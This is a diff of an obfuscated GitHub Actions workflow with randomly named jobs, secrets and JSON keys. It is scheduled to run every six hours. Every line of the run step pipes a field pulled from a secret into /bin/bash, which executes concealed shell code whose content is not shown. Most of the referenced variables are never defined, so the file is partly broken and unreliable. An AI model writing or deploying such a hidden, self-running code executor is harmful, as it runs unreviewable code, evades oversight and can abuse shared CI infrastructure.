@@ -1,36 +1,33 @@
 name: niuyaorao3187
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 4/6 * * *'
-
+    - cron: '2 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: niuyaorao3187
         env:
-          ex18: ${{ secrets.ex18 }}
+          iisk5161: ${{ secrets.iisk5161 }}
         run: |
-          echo $ex18 | jq -r .qojxk2540 | /bin/bash
-          echo $gli35 | jq -r .egip14051 | /bin/bash
-          echo $wfes83 | jq -r .hagf6 | /bin/bash
-          echo $q1720 | jq -r .zhwba2739 | /bin/bash
-          echo $n45256 | jq -r .bvds2687 | /bin/bash
-          echo $gqtir771 | jq -r .baibf7485 | /bin/bash
-          echo $rijh74 | jq -r .pw60779 | /bin/bash
-          echo $f9 | jq -r .o75370 | /bin/bash
-          echo $nncop82 | jq -r .ku92 | /bin/bash
-          echo $rj41019 | jq -r .t39 | /bin/bash
-          echo $qwiyv36072 | jq -r .gwaww1387 | /bin/bash
-          echo $hru046 | jq -r .yexa1 | /bin/bash
-          echo $m938 | jq -r .bgo333 | /bin/bash
-          echo $uiqe4 | jq -r .esf9 | /bin/bash
-          echo $kgxe28486 | jq -r .pe71530 | /bin/bash
-          echo $zx9788 | jq -r .kean21 | /bin/bash
-          echo $iir22 | jq -r .sbpbq746 | /bin/bash
-          echo $pcsjh138 | jq -r .o02 | /bin/bash
-          echo $ewe330 | jq -r .xexpo90616 | /bin/bash
+          echo $iisk5161 | jq -r .ui72 | /bin/bash
+          echo $zmlq38 | jq -r .qjrhl48030 | /bin/bash
+          echo $xhd63341 | jq -r .jgoy60 | /bin/bash
+          echo $ir967 | jq -r .iahtw9 | /bin/bash
+          echo $u101 | jq -r .qhwr1 | /bin/bash
+          echo $jwlcs57 | jq -r .yxwh0 | /bin/bash
+          echo $pbnki47125 | jq -r .imvl57713 | /bin/bash
+          echo $ofm1943 | jq -r .s734 | /bin/bash
+          echo $tvi83 | jq -r .bx42 | /bin/bash
+          echo $rg5676 | jq -r .nkqn374 | /bin/bash
+          echo $ed6160 | jq -r .uz294 | /bin/bash
+          echo $egp6090 | jq -r .zwu92 | /bin/bash
+          echo $at18114 | jq -r .u2 | /bin/bash
+          echo $xaxp1 | jq -r .x93659 | /bin/bash
+          echo $v7566 | jq -r .noyad1268 | /bin/bash
+          echo $b60 | jq -r .bldw9 | /bin/bash
+          echo $rtlm27595 | jq -r .iv1735 | /bin/bash
 
